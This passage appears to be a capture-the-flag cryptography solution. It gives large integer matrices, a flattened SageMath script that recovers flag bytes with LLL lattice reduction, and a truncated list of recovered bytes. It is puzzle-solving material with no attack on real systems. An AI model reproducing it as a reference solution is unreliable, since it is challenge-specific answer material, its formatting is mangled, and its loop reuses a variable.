6486208168080826945947944529233694177662309194243458586035079243289529403209214563553570678003421209117688867354394117766986203736623158691020710654109780, 7398546156776998261514685676507175892439345074898194153170827437133975626189106828008979089454081829727958833664520120095955345708776470607493278266000620, 2006625130112762853798181003517088981275283720139177952915980525571882463426079513561848333138638158153690406911430220826248759322550287031925860283598156, 7815769315416209965153396453887814717914440258040278371881174051912306355999613778513286857046595700074206942521946565457737817737412047532860234190979920, 7908453838668077038021322440707191494873081904584150808807901680440108071445944788194235866561297044830863815159918503603151310598496892979820884094744914, 4217740292320183903669893780413823749638005952301387346872707999764755112711645713367759978389973161506385844517263634411004914524003623069486014481191501, 3474801546909289300231320026064825202713204134823614689573878830901172326038765469836417657781218840392116686787216134363566106076010373755288385090982561, 1371925959866192861259305108627402703973021944878771837466937572492646133917662135028547419172121474555413324550276717619663530202214281052101173966785249, 492639853074059632872461721136758814159177332317678736716584347719405445441740531781815431881037846740857022210239744480927796793968482614884910805847672, 5015347935847749601768467227483438872191431730068310154499511075000165107217508363628803376885492746486975700155368931896790194991374480045591419645413055, 5041151332204960861063204940496132642146498487086267016463972142287842660132333536565521611733908000862456737721400396251905108020599746325002251593939354, 5222993503483821643221292804163602011313508218653704296068012646270025993850707688694147377840132639728551875513495861656068430293866659658911365425380389, 1891466976356757149796371702894456378290908028820594479983645488539301851746170994676040297074217015503458841326529017763623641186127663095979492832135479, 727958478105784183637043049699608926341997662818102899794324054304732965552912022597524796364042096604314313919405547771509149519332920055542283169210427], [7810834862014855900563235587299541053617641025339089208932782244639412358229408633898328633807080892750015163291488400114612349223272646575897362038861468, 5589868078851764795284480968355264580178032316159555511301307418148731800332193750323458495368324690182458918460126148054147478153069708702473366502365123, 10161959772067205388971175558015613761894111773117277752686060347038892289925093167827959059839790894399241986092648978819735269680951582663136722379928645, 8314001433341532995461519927969006667177915704129944569442248330130569736788048683581421310880238362863514593766860984103719881549758085430963537764655882, 1256691386668136741789394825853713798704849571318378514693017466404349192632026720922008670957274296201544764905577027587906898582151406285361312196540018, 2919104384272537702438949000709235960784809744328357394224928196705471321662169074297703918101577817345347503543265302515117643675968616941451915270775842, 10933769984319718816993495026743198608895213770752033337070720765585720697138573001598391831120914107744663111173202637433584299336659089977670410110865354, 10568252633421480772041832501568045658286915926162870380863550407503362998425458066760309813361762860339651177115343478380704672732196867567863088829922952, 5129326307979572732902048128990793885404863138979185068612822761877004729749152259157520693011289348476318351490023952820063911180398601970704120299683608, 11544518411402976550743209029320358047740789924049345025461248443397957269762262510199833759831849483397589450721332269959060988614258759174156013291252406, 6565142912581982387251489906788264443484597269200547482027607224518490822250464251830546605709904252400095352712238187226282841396682804876419903348419581, 4844624918831705655364078802803871270073864813427636853270941495872665269333581031093011363249520436639514099779458991852964201408877107776800728565122959, 13110115379138251052540599891565773496033209615363451545061044767771391476647496401429180995747180448713176494317923095438594772407673039447924205867517551, 830496320033852223618210652280012069183878727241692554068414064681606119702915845692770574980211823818277387277699363381209932903105373834565406497222899, 2544645383582694173252840916443327526121515122235681530728351632725114203018678616114571876382052834233460116530197337412329780223413427498005065309315115, 2240446983698342168019442288525036235007197765750299960734533952145291732528472754176754269374555113095707141455897759370282955881711660803931441897083513, 8848957539690020386932661423491982572085242936908098139329881714016544735234409551897299139272253642039172663802934351944135321189901511106582902482702015, 811238053318456382665290414461876591551805491104833834181650828999120329928310984140152279395306721982688342810412869886050075200601238306137357895846310, 11179960174248992475364777244956677961915032417570399984781003682546697401219812467588824406175825367573144728381852862738106855323753124051283173785422619, 9403132436508868027085254347437481325415904817769399211936994384693799821245316050972785404737901031048966231784689711069400237230451371127302270501602529, 949522718066702614108836782844645302491477078376718245943137088002954018463609177771545680594068510979281450493231317407820715616209746842483789486065205, 2503724395193940194502340487990092521319088362336793641814472121233051675761817368263497599918181392164303024413061227695776486792161371013614451006154631, 12387723271285363120256130267536430946414806874396840504088634064274377873384434165154120593471336009980105976065916858729835454333714109187206411175641685, 6479930704908533182527891497983532671171935747457627787276315322208361758228799121043976857299962060612741091870733005151719416126376335675909747615071635, 5482723699775142932773268572754862911497921341145237802707934850260535902185100659991852717367397082631825811112931083402716075127856523855265071775426436, 5782618466192013053553922542055434122838652285815245466217869247804788385196828704936715092733728520275151643932751401005971700406230595079099717461073825, 666828476558095262766578411268354809846638522636374723977327230281844872804926969276340912876840532347936511923681218081325324844187994860557815316997069, 8032881546836258006345853455045781951325300341798221881887754620363699419884097438169031563415177697962582937836990787936874433197038156705682335060382028, 8680764842894218515573973899588070177704360979570344731721321390760631102155601555906536483790219014617199908295597657571582226080498855537569450300988996, 10008824974835147242361351179791312298175666720070289695434284206962975556284250911086841161735569196131213739106781042454925328985750257563633499003236502, 6913447703551458111897591966641284040127055895175992576919193759790849180130515769481088472746380224169527105499234885778770591323025779754013737565662440, 12637201269554349311121279131245224400333548138450922846604429482314363121706048143290963454542256618049468572141686246567264677556070957293427679634163311], [12903479579960495664394620671970965774711101404848987040092224824102663639177980002782897894785970253982346023165079281807610119007236498238413418039533550, 626652581121837713511908832032515445074333519027722222179799450703436546510821100820878106030285132478481136194086502257082784910993512498330213813904029, 11745754056366180999733870844144721018917037042379078900850855875422925217674320019126994723046869070928196094592466170796969085360577847324579032986329807, 8553823908640252250506699840910349559301453411508965515605408647449743094259852124187339551058706901327116325301694435212868877202696795217402026844323468, 1424099744783813834498594242048022021680529537507018356102612614916968911590522059153007818666119632029800201496803671096406886312241129496060123032868791, 7760682226305984359272824877229693354330785610367212222517111053854374158411792177286956603246619564695954025417314965643914620512980596512651051885672981, 1476192742876867321944176606103593526430078368925256386758406397443579930824652512297881107901306140444647624073781956834989728331400654389285358215577834, 2871226114764734632545157776346955800955620005720177440955386837545679128256866674043532839526029869407612989555244582018756578715973595793483545861881334, 516121138582414592447763546998589601242031355022940851243215327993029856576324116763718743962716402574584417881118256712554222578261054535349687934445889, 1436198101829577363286517131355797321833058939302835389333915102232236915398713646126984059950866433591859195539509548780422943521414254439861191504892707, 7159457270537234226329373021108837999778713259471857807467707834558357502491749033428386571894488743459564033729094920897005931655331222198544580497168806, 3615022974206837655432720418030855585746297278356390881681363098251034602513687823631959116098118796048362836757397597878180940221402650439100118830122034, 950680272233554161425180570805722026496076721745281452746342025805792666181458310680392133282919390077959552476991065735936839251569980463013974517243759, 6173129217300235628515395157413191982821390035162462427416641392055658663248024242915292952517994104625122686384481197329577640560552470053121998219546206, 12784967619172471039518908656527633856999512604324020931950607975584859468382041257420253574572367157592348231153890808587901567240301741846070515884739287, 9347878509100340940097017882375246668826654219416500623574569273675002053509786051998706158621457841922136289872251368616364129646056511533911134406110869, 4380140784503084889333303187637291165318082402584778043626139928765947733606173354849816983172438948332693160939532561558675111004003749884819726778820268, 3938835622977164390671887363827306963159091767240811956013243280156614293037563082629292899948577208084865867007587782721832966461828807488893236488136068, 11093569510778001354136024615702374529994044747278313707218683851902188587681538968833487586080675719938792795888325235540272022231987706059308067262378109, 11608519362407361510520362510569535268905165243242372327611242673338540937711024483783910141783092063403834407848526764361537369642446865673182191253007759, 8691708268462362530970363605141880548826694170942150005764687885423425163675882662838685004377033463401001983932929623740061576175419004001147559373122212, 9765607335054059192023765350682818403508663479513555518792764543305190255596244279303506385777747319621935229963499780353532226016919876439799613868855900, 11576414812935208790307012541506516494479208043019915920472172208191767366198088887671340354504038964530881082814019419002995252954425168034680911778911385, 11661756569910999959008578498109677701340554200912358666677612677982141161370625120735009290314236512878159605782548687878700990825236938673267227748244134, 8727276103444802696895112755668802087296148405882732576199037964637248248941720431638639961679366186284674171201743628108057502007989426078142451889458119, 8231971647068206315289553840876085449315290497932991358846511364907473116842295698082594846415584661245614100772658909066056076816173727658750433909260712, 5714271303456583072926487742580220172261756482331699844921846004751964294562742284880550898419935052707429108382178136610126888483763538074475785348154368, 5452281627541656397935595456222218239683084261571709175095060331976536258013503170272853781430769623079647748593636819422237014297054901274601101619419238, 9584496605260743578990302181714387224804396414741993343070029134652061349509868894174496228864034021328166536162029627639324328101490493529927008924170212, 8041962490315121323421219998745196997686121662715980610237400833506030505378065631704523820696350986418801371213323728592485205396675756917223293159187740, 9533133661281077260516367850820616045749323967032172734658838567869890229947629398533887400872796059805317868279824319889198724315590168411195073173548641, 10028516877747187876763699686042972062284387038480462790078980104469590435618536520638960863297027755501478425120444915970787437943707871475640424754775713], [6466706209780202829923036913944392647426728842186836928746588450932189292536727928001578252589775727288490023078305320071584194757737911421498903931070811, 11341275204743762239623891278588299070777196680601782853974970625512898629976409873565284244944298812157911668866887631055022584798803352519799980213012030, 9514303470262480212271430907818929298229479261109073796714101322060236529626929744512353360517035263367551730456437486483313361950217331820550160031126530, 399480053423260362065156482330071559857508371215586757478354996905544795764007971679321181596190009630869562742525922587319944676056775580019400572476473, 8274934967206613741671501460654582225747473292997413648011830749246123194216492497404903650261508220547034173586474867717928234971432852625686273762604103, 9955691204678208449103559716612440353071789133890798584984137168152051337251770810047249692994777547201086734192230939295253344462278468630870529141666772, 2731480109700693868040851168058340678439540304749520786374850584424474040104799833647191437188805687661481704675580141272465547135266796586274058920169858, 11388553789233593655277109498144325776571909157323012016483785905831078464242169682049359003966582264423107568467376324938311538266365292056547640669640070, 13254374596191848906522749957208847048560967088214686788339473810879795577570272421026940714683649080824638899731747480968242939208819779359124022033476395, 3719965251453050771888385830171595571306202370369572322170955379915534019841995427534242907944827119444240687086001828136654455612875457895644624045893967, 8887288589886680401185629216243437267807475214904900897366338819432038322001306120550396979273621577766926842076061178304292227975693971890079981904203599, 6114772241534515711841981086668748900670350064952377552796003551170107106962332367940973460231430211496021247761721132193789826959596803046633258781603609, 990860110315529319529013006353744936192085295491789326598173087798648303413157324788826540782990176604650698731916029420106414931892946785584059595170776, 1264833679428310713492728368705473520243205102415881987296551158772947680307455030541172437025557431310438177287226756447689801663843559147065006479281782, 6299856145874466205129381211733164936965827451826401679511264968481967530327263612836282643420489484979350075712185353937091069711779886896916916475779057, 11864345517998157395619389829429752089605873332960618683431131569043965882359753756766877807402936857843943429121561030575161906405388351268049506930708483, 7408467962580291349469990368779650567512256118197818959811181350206517255681682007742150650047262624312022311237460842584409337262507183112425439853506660, 4758329059566217690545442975736523452332581569654477142887209003373533666657377896850549658771599508196759764547163054777568988844619260073692957809907232, 8181675820727917235661480062620079513321931845478337425030386629185926027669326312202455654630404129192173243044407273166196953394271002175282214280689637, 188489080416928016191074709872542427359351679724899751671822458499248016903965938230311455921263101968267157293607436834590801664094539750253009088824937, 4492143364845762082965849921462815023514226282367736007370213953302416454301774488918456632485578049900693257668646008384469418072006541608625239335718092, 7240741137579578711619844926438236878554623658961389108984724919348222840941373216070694956099471481375323438724739779478135203753378793693185149556970989, 2779996346167137557066312366546673632812281145254869421948318300622964774227055274092751443737703641427234054108628486768945592063040306998435846777570961, 7732693572394629733265508322144093086759947505523401226920109217838356663495732344905341855659862351656746029007110313694338818423933092606602855809890748, 13094736938761368541154016267294916253326809399244678646727955514939011557990350234273488345602361513043047330234920839351046186753483488682267684659660592, 1536375301331157227331724918299890209769755970375773795358837544299112501036948163089180624932783644767016752381197004075070918954862724264026391591898541, 2043884173230989303742290918263179578261684452181337984810619274845394937659600626447730725494272563138306460959849687267218660635791616763745991977535808, 5729190669543143262115342112430877695453294267804597521333828701147685743433173370224973888785744507851367571309783471720498319924722196956028262633675842, 6621147467335485226101635906834227746935996039653445300576207830076776732221203416248420945785673889791634695420685110363462998486156545846781959402579103, 13351467765005292415234228559141479721307452669643385028262585373436135137742051264037937293434599337908724381705824662481758366761039578458589300059458098, 2878521940563689202003348346812030293832473977249542160518255678387205162575888473856014208784141777828152126026674590796143675161465775905199623628981699, 6431575450518126002861802998312945388728577027952757412299318463170705759962996335419256875512581629074988670591127649478317077152319338948528789503605526], [5118833208468521136890229004460573795212504164144976193172906385355696804886052592494337831688966665034965448252637834243418563263430527993565552759961039, 10334618259127282668781327553517803970451918996256035494858229902599575587718579947047512506893806188448081926657304171123380267282050421241502413594693831, 885535236167806811616275470395937962075880871632509930964407719712053797691245234601427495002295630900998046052722405625226652522014837181390441153850364, 13389954048687509866596559873570375680054512694027821568905289295033509417357903610891037416890479663418955982577192130040191371932094493442023052569174196, 8994850550220042396934736111765682698868935763817029675522328401534327758795999433162292655112916817161562057033696184516928504476374363290852303840280808, 2284292455423849420280390017881129302692418825703514883103438383594220931946748290938935191738810134031286543680776040244686902807150959381072234601199722, 7103575397387331064358232578663674207602620294089778886560917064946264607699643229846908093195297611070016557150897532324184539290600567822654331336477155, 788696367664221841423074812440054010217599558428730915190886943263099917350397951536970276226796622383356329067864984313755382466948606816131815592813928, 13350324131069140620325765698093357792945071774029373080524102289511763876825391824031640265205751805805324250822276359510043776132208336722273857553965359, 12184003930109871743262347039443994461557573897816862359115320425442404794889405089363785535730415290754599964273386226389187028213539569608517011461645262, 3353744006973253731662111907117873314546095644030545770570517317689915100947189544238696628758596732033979708054270600433788206418285980765918455961057911, 1252774034045176348809591054667107719486503902977924170114394873210738497300017159559068304646142470166324555439664820280017453338952232528668895609433341, 1222418630295742514512243509000288293873055407522099715092903426149688738333091563168352126824326429097062258497422613954742652637873372804788200033049542, 6521763000350515773736785315480838612150445082403194800580158685951951228208665239905201182564503376996825767277837811763356134444463513033409555940883831, 3562022466161544278826550917027631589529501247956588894928603745307437138908191273867088233793675565721969520065705386521521299369289107737653379863814284, 7172215009791848892071342762786857308163302913175430169919327941822446049244995391873991391350810746802396484454840792440230477080347517893593750995751611, 5500568390458099866081394750963325942633729161840006089572955586730864990056811544039662314595980374863519450124713096730561620422929156152019498678065472, 8973720025361985149674829734800253258183140359830282729611805510277236047685179174253837412706613944854554665039600699403638930163459861033370361492103447, 5882664496673129143546266742283084329216329531032256823242004177996824697172366528549619240050398181575151061782713285767782146173347495303883407438041027, 6656187769208711302183288620004702327242666555567580831121339492628314734723973496133391062180952786468122184653768474667284367550410070137861080616594578, 11383359825159357223456884661879395294022245923438685624746220228433711917136395545726560564561603313877055335977235097889709576206849134801425072429223205, 9707191074745944496279281107367293081849912884757570174091724110757755095717761172947958289884669356615737323839418773549255192040303732368181663863269081, 6197111988565868258419773500762877071566884267190081952733907556900044960122441734150682999619921212163098488063099022425221553702842356838962661797102947, 6996437527149074827948421339924361324983084057232863377773186341327186477326092674953144956236603379916873588618557640362737112442301767187603203337009323, 12367841293460539592675251979366015157379403976296771040204115298797797978372027052001182580584625861690556354589592422522663954319969167396116899894386528, 6812155990464088316225738038476705690494707853427208882292012204195886989593254419033851473093406653752266058138655038915264582797830344902557715466331428, 3575900229365959247679399618121404144686537739023801461853061461372048497720255492346081967934126206968104637746557610502238823991145871655235065591276340, 11720180898438226107213660347262937150990949085552981900041835535241392808850175997207567464474423185502500017971656720628591969328652644064897263723523037, 11125265226691836058064072574041212827772058984247825250012970824884956289321160948426896588744399470521783649064826868482684977293846563261363596960976924, 7826911660123749168063125614587368288716486191378459061091607086505405686297727464357336482316397780141056329628204595455891513225656314676594832850563906, 8884072365517306696940145601962963618958336334135167427834869884071140774538322742984154088430074145810887263042734386301285920990451910354564698151907038, 5044758193710854425117926133999863862272104750299156134217948832288914272454309730921090735982570339468385078256362060792589032464615495951748215618967606], [4162595619027774167935298033493312463955899827316885064253948556891213337286465005145319158557679319598325583015875020991784835885027370347353003608474671, 12163590440940919207374883902253299224280947736080912296644811927952918130212463593093083434615647675796809982760915078449917003198518408652550458216688629, 8414571479742501630705680626674080477380499022332569141550937158324418411775356511088883439905216253437643510640193225975671192989282537988176255596115537, 11078756489804182461946146636815275217484425392334579407066031741374321219783224485954402294102888258343488618039714902333142662360398276641937412581558295, 1289312059573842490588960129741580783895917574533249283279130530657933608190364635210837412984543647899219303837087030791024626446596327061795238396153538, 2717060606004881530627375775037180941144123660902903896262716576148512057899842609762830236388986425988117926629627360302151623825427445530744729437370262, 1928698615798203702826417093793915888739137325087074290813084101726004628545888716074280322034417841982290733253810794356818514696232266779473041451227371, 9069017138704273608618596185950622566942964082457604118812725847883398140110424379957568203156639011845134373109855384721400608139895362823018940042145987, 10659747555730456720906297040475196664042384018727358580612474986281598615704882111143014468975592418378884871843502458273443389176457922673640912434092426, 1793072474001227983767401136509382011072573915612549037345525454541596176791010022007417149784584214949978065353610170572697806906240393140974320260477687, 557184225648608267843669187381261609195989632567366211398026150666755498316381517226821722168030745264419230978831125126133875653984087928639090210574561, 3733562468527523846864690256884605633079993949659701712809702422854407566860908212303078994944009166430929552698604136064583665275675808298995090944820168, 8369032469260854786813171014982798623061558032745502287792951220660122790590924281489804818629568178157204014217040357136752525902955059219045699822032843, 5394849846288502443961916294268888833230510391745446574356768619425670929092425191915092420708285533370452966353000083379249612886412149057624641102430453, 6679720902911309017483904537513639128948548397712671123342000083422675862799824790290498404286026716876396884450873525665221323233784809704921964543641027, 4215917762987786513559960849504379958837138451272292166519872393592718210620203484520747897906868160443647046334311510734212609502761138773609800195131336, 5366092845456801953934194763784113443890937820166735246822689379335516103632752523734582437267268331654946631653982617043757061457498022873378162729134752, 11153711884737193691923189683882481215591052805277951428331287984848925558871413985069619572249067411746067532504881081935607850106569628651038866913672351, 9936072981902124451492972832596297720167122704936782177840974239855241079888195783229189638880587263319843943645228529080929509420821260139925111011998048, 4361537197841644738565979584345466096658485196331882443380293717839306555364637312692118790516307646871481777229878250003666503176906127155626095808510756, 11964088601546539517108548965457086706052647472149616342660332694363001737897980138753758634401429447527386007259055479009503382716160042491898857124164274, 11286279209145138048691612370329704401562949037435543254202835711631175335413318453138355306999170574789369045269416539652634834481314099304736831108362760, 6596614657582797986031243145230519447655432664317425540761378067301468438134458100362265617415422901338295121582782805127435108871937602522249072564466742, 1982209660755360816763541572391151556579568441820236759042050050955460587166218048216967088105714849069243546190532649761881595363512852528597804562961900, 6734019219126838140487023091504058585195955348475400368249022741293192902675158038490114489296518930864382127110523101630684892357060968460707858851794700, 7583194371299668587680183280241645245021934191873462151397489943252020368475886181594744927028457167165514898465795620390434384266363992538132699714785555, 10556606133006638380177897607116942859840263859694139592928045602712492552082440952263625484858323842139726299964745963277665843308802094961829027796887787, 3530756861334702189252236878276550171589325352469318959205198369920326763552593404819623425790754700969155225129725392690453857446500814440143464540833903, 274987725319900760492956829609633292180048371421838488225701854449014484731675657020462653584885336328037388430139755780735395417356661149044956948316604, 9994996601831720278171781460825712891898624939902376402108605958345077976080881709445726604216813892221561845079725350632294566134357124851289809687229950, 5109717191799872204252222220863457505319724503430559790932849119920774217344719148507582994157282636206524129248373549639016784910852777657914625477569873, 9164983099152283357379298300485059222096972917344165684950535617010940430279002039927370880055247858394404239557932493391197279933478533105335909786454376], [6565252230553455305436722698422033230730915433286468058688938844225894827348181803467404879797311105141581052085357626812739820683127553708937815438228282, 2167956859470852466347819796764167607824341742326510884929521805105562771580844144882784226239174702902580630781197925450741947748948564470877853818976910, 4830785099302594733997028457254995738025889137203011846332221840532641285519478924520982489319607097752941577227484495592300893435413402339724512779656491, 1715643836834521815850330336121769197012793692382486697858661025579826148321837243646220229781005977291973781991039910022380007257070257231644979672658057, 3799283472634963211226036149417771151397790769640527810199384577747655582163492797056328487488016704675104127454261277650806285528925587145786214872028923, 12524456291809991416587408022528508702807726577226463970620569066685595102422697587654801986365447815471378929768834268605394593476817791632513796617898419, 6483692737110077843677861214841814536751766227123963697334979042761453386107488738962641715406481832468565082623763209207305775679984760977617485827967979, 11081082424772733695911275597279723232760493160360566701130493359728083361435004462205629108083181368050779387289298321135675087916265692110292665556642215, 132304429264661147809209046098202213294416631828361919726737293524973286383388251513267766809573463508107832633508157647730621810146630295613063732236491, 4337941234654182913007544048249701466685405028204137679437007006623916580053642311147501042868224618980151263426852095377896532160802766986099804326557845, 11946674331798629292612557939206353186724816689156828722029553245494188040498793865438023218276187853760421711381555867837933520656682712625946806037227187, 276001003835656211606669592675202121877346227336801432046042693416804405784654565616264306965304941503000265045096819543800181036967462162837659581339632, 11014033402728451794963426939711226815601223419054865152120995425529870553697598091036355545497487808267175143160585661686066457637313877577328237480528222, 13604882702330800014187108192494937386217513926114574242692838905130174074158711829409527569517690712610670815480472932199264456303353558133470993294236, 4145894163062249825501103607623233443065911294817611095421318359944330844020828061128527248709290846557158788795393404316904478337813342797675919927672481, 10338894418577668282495758179852976838059050150146745572133158289694931505253756029096033683238928793391504569413603081342283543584569234303953050595954921, 12277015824071855904628231125952808773022762787076875181778374073725863608632951818241999428691057756750064180080134651079365187427770980335754958262254950, 4433089399104211839649113604331717055801812158137805979315878670236577190017065462231796341508012031326480473303281891513967313676574464640532121461853559, 5618429482802211276024300803296058348835814296858739013463215580645419363662525951318422182962201902087456117944264033402475130627342309027236681541489261, 125498969269125537095310607509265869834731009705186198523593297998420541303536721787309156121158591712214502123843406970585375280638277941665474523016930, 11979000798783613134622960861977013600143861013684171716748167717932335665713299265113210309154312503350628485393729780811263592437513481837885496792007737, 4570656332129202488114961062559900846911062086723346835521051423686892242436860979305394975626526793663008472778647301730730215410471274977199344239805124, 12993539164875756073429847196495092042310048895939184923594342143689988766443747313119849954999074462896656553018535595885148127627646726636481662832294543, 10946345387040923023289674992546725410211474454000348561144108435846007658487637705557792536370808865967108306512661149559656728393831875269117680659607294, 3079377823837627833491449374318066736814450502457304849634092443617160831620057450126351104333175301835061854267299044573392578674678943914477445061022993, 6784829341358281512525584722893212363957042177867804374976445641858155812318250861431822346854605835385770909962311439826357032238257542393474018371633815, 11957654851460742196062256628083728592906354582098185575778713103537955974402315967346539734727162547326892037809749569161736270788666998934724705773907816, 2071938217354553086642448887969360092466793889892199773930877553830229673721590040253977717526721590454601275858986363303463827454167143694302605102099603, 3486592876788958369804396325454161913463122074842400493988164927801629216801974621836276420378201854172271047865587357963802527268681977834200669933770231, 1322669299932206882324446226289413117762245564176213950104122221356572180503362295062422441082514169894310552731495289098389310188888210155495526223766775, 2590858092428491328856662930632863719259586247152134009158953030504460936570989336137202956546227343449878613565233026150117151318170196344754299569274472, 8550554235082854588364015204465475368267984886414564111885394163445679484093669254159515677879876892174710718305963010278482896482637418053097107978095533], [9803264205744405067819327608127876254544164284322021975994717831193081060785624724551377115320986051089623335261675588406017737030223808745951235955646236, 5977586396360164405328384433328894661066395739166254247293633990325850631451136171969134000803834878399094316884548645541986261884700173954558422735098043, 11309234589146819411270520306704722609531618500114037860582987700261349332826475573725931916688293943259955152132193205015518177199711617759073397105078525, 10387535243896833697675551691353361138984745961826665620605237346662733113343609526951126678399547215681727700990104391077217628023880693304360399732666449, 8366785119321182531194397624787496470328075324907513516954961618978162522766012445171039240140399577752552523303939832395201912115718720398638217794318785, 11027493414416631013936973128232239318469851111034884769590822389715081804918816877447899902817007814284146227602229008475922138954884189366968486656434705, 1808760320238715322884223534470494744664216020152057883494019930524646861998059140453150960922618014672234171166613458040754603980608683633558861643497780, 13104663165335194249333442914073824990621977763344687151457648414814499965963315677512349933844531842822185165187734260331306854242889927031254806489911355, 5622524989587777938525874157924116049475081119216329720236410086787222905464217319009059580651079975952119709748065017646591449182204254181654619362802313, 7137139420761976463868405112814731268166269602564093776356666571529896760345359245150473216496387485972437655624297782965637556417132043387551664808143408, 4598003232416820153919955912449012791455990218393101474764462196662599758431831156774429915376833497070402255537887815283508444345090212674593324609811913, 5209081068971466467869134594550759939216018932716133509209989900589157994981865976737055718913787887567501251694507269920953348644164386980646849549862159, 9518770046188672202004382421799510597005093144459539902483625544619019525904210412190332952778115660643812961747925078505378449047997552196334712843208730, 4157480693523534884518397148026958803373674141934220580190726430285837590986334728898142059078263817314752957613115062198549766496637130162404482688638194, 4411108278220805220404216607120265607501142695970754756417681648050437675215049693175262536700905071308400208876024004630946191589348823311525431273786900, 9132857175352862450620127952267305120964412442203672134373034796887450112146224245234763895252309007389618199228525922627569142228904079839228987453232442, 8595786949802555336057571021378370773261386323474039278245982335592031248975663571138724204030644201335422277064249916487607576283808366934713005365603047, 11720231979455351209320840646459747379387501486993655943339631436604224003470900394679596521998516631228893849029582779714731635882227106168854893188723685, 8394956286987205331685454820596109527157321707572549634864043556839554998659283222802778904122074883423455997619950829799244920041781048387883300936241244, 11440176202965637193614522862390591429713432277512771420704820172917173972262755809989274602767646692363523021096666931990631235790997729953445022890889284, 9368162984105524550977839168883253267455701665423188149590575972461921654976655229892093634162001246129455214785198339194517580583098656290553610339779248, 11782635595240137969564085820985326881751450904643094965186364326968344722360323513143751915670415850238455813031913629058066235354378664301151770466530013, 4360675215734959700355187995662063797933650840790003751850871034389654257679343971240439944855270843057013808924456443475251964495393533092657862714931252, 3848325261396981201418135558682645548330703566741592607707833346008557338656672939467018332173598123626059345098291523255152476560364187350388223577101117, 13088957649619411512953716507974397041865832905484294973201190153154726242228671506162988032088910058754465932680110488952026248239327859553988320350996516, 7623833143809525165695696307438603945358029344441472145720247435755647295753226436719408868905569101158958333015356905637559779092559560451450303896588712, 4744416310537668230318994791792697172333374412465869121242221212475969953774365637369650257827957602034294439498328314111786097393108118868248075910471453, 3331820851626686223795509399894019208867532727888699350141712114823447375805579460734970026941195506708728077124232164108300484632037376505547567516242751, 1679621072695314254075621198790582868886424834120330567501387927471090139135542346728004580364755200344873035273246651108427848568734346106187652886060894, 11489213248716132726520373365443431035265125672652394901579389716640248526820076568973911381606615368446228750537545119647402783205006257700931147155091173, 7042901135758828107096789167384059919692045179336693243585580539450337333471344918866053978799038572173093012799598446238764313612118434189872136810521669, 6593221561071650281346535189078389593348911492696600243521980948206286213268624242926030849562072358637292458589686068195312568789422609801517136416464754], [1774232230401022703522113747675894746213508319375308508113010498420720501349339445201359038100082150903897299735818194527848482354236389371853482405530742, 5555991876684038787321174619421764870892499636357496393077376279886421370681409079485742284102554185028962357877975195110908532660359813205743585120132392, 4770570194299070546062464944292333740381250654690580033107468976114985086442746424876421825143829495266545735940319461002404450786135640453699251363470571, 515718072569728540782156799008567255211678644625022518932762321006269744663636799452192380574729986624752035021347311014716807776389540361659286324474710, 9668145483805453273104994376798119107918535524108212631168603822869463578008464418161821231366084634233928101874850570516962289856790129098423956839801559, 1201083188505849702973189493363950352014805455287856914124216211314483718859879701902008686876253332513319008326849072136149402979301110732732383086752057, 11597052027264073569460929308870312683225901510230878595075710325069899095269816801506393265014490914882594082563400446576446106437177312253153757213096583, 410096789721929898902773329797644633944301437810454550837658631544808829419257095531840736123169497827339648938111120526030049719786153176234297234172638, 7033818943710617383924600939932211139199285930689548676879426665479681681165689762767665088568338328054076965860142732163909842458059520604918405133159542, 8143113072065606065274513390124022812814501408213848913910578884527180344977058718897191905153844098398752833106183036138512225053286927155643145743381666, 9393192204584986231499408789231170090622253497712045071790363735944193783464693547348608623180652310153349127954270894721277944299929450533205007458957374, 9712519065511419923788171568726352189038792411754367568173372645421861924823384435395507093817703295302933313297669572921106493703626568744593741383194320, 5719999426882816667078175731681433120395817522981098492896596572002228306201414976597471078759009871664381560565986563312535607243693490242927361831499255, 807617565667726727006593324456528759248204705802096440451555340870696085779551685032760468434297048759329387003545928301332163620491020877905370929718955, 1067745229258433557981846301391968230388311080639981303573375051876917995582507389361980399685029701474918682462578787076775459039362136291423361518616093, 6194827951790993056755410935748047397175987062975220086883124611702720828118903433879707201806134395873074808613147581404623626617286550623917082179431756, 9617545006428891161398804010416911924666873559108227300992879324340768396833862268274848971401000657229447650824328073520650156333764026418199256690436632, 12261294123791187540815642470990995325742271072053706788238847780900653177120529872703004701029078351214320303999576182575960542879294466751412272349862942, 7404368602062584743033263339334075957606793321698519447236811496946507203110944224254810988701411822353932110020305317960891340413693714711647338888213923, 11822324556312616644169581516285063271540148258549239428588764131079871322502755987267645648801226255353785727126324072624692314215741292046757884395740262, 6542505133964517065422761205650626821012397075204061967005094586082966150708082328701075126084154506492681222574518758417179384884930076502077621571624722, 5608993506469572678446672176289714911460265647451072937048635751966089485472205815283420377062713372672435258096322646769531318230929735286267850441852748, 10122584860720206454760432677951714459040578079656394055294557673087382202131515382050343658263320408380550291946580479584060490465942980850719901605560931, 7301571841317086140073332685137634506060814480194612859441253358711787721984767867594415731599460767096495218834542695821151777063625945295238353901096411, 10778781596975921068233551543189575973473353662153755897451530374518203831459489072678187843082113980357658547840192910147120019874180106412074577138177058, 7161864924651601781169618691479613534554431492211415387977908530963581973164453329501210670963911279776460984963406771605845183973979243998652244167314336, 8480132850820319504735120771355669808808550233598755812968731862836239647775605892013340307589544339025755192578724517931103895402393951390079001733644046, 1724058920134670509235686282132227525864399771203986753079720824016735282110681908855260948980351969012683579541863659279119418024086933015933082432914007, 8456857909940449536877058839719796807712647394625469937899475679456049839119167347880107804537189544629053451450241490414406364899755575118932884194984227, 7068620722437623599987070774137859722530351447195240872995589554850128219335193025563534078013784353194163864155286259959867774044892835890343647051200721, 5508002892332550569410809982198620336685616155897558840588923291452402738975900431879405625505712136444096660728015783836242865404916600628162182012675261, 3621105202751541370795848812730317051377105545021810460493529409312020860631405638938914514058113097478784290530912732966814443556308695165763749575498919]]C=matrix(ZZ,C)A=matrix(ZZ,A)n = 32flag=[0]*32for i in range(n): print(i) for j in range(n): m=[] for k in range(n): #construct the matrix tmp=[0]*32 tmp[k]=1 tmp.append(A[i][k]) m.append(vector(ZZ,tmp)) tmp=[0]*32 tmp.append(-C[i][j]) m.append(vector(ZZ,tmp)) m=matrix(ZZ,m).LLL() tag=0 for i in range(n): if m[0][i]&gt;0xff: tag=1 break if tag==0: print(m[0],j)print('end') 123456789101112131415161718192021222324252627282930313233343536373839404142434445flag=[[98, 49, 251, 234, 87, 73, 162, 149, 236, 59, 80, 22, 106, 99, 33, 254, 22, 235, 196, 101, 28, 33, 143, 246, 157, 165, 219, 40, 23, 166, 101, 47, 0],[53, 100, 246, 224, 70, 96, 172, 248, 96, 14, 43, 238, 153, 120, 85, 171, 83, 14, 152, 9, 33, 105, 106, 46, 213, 243, 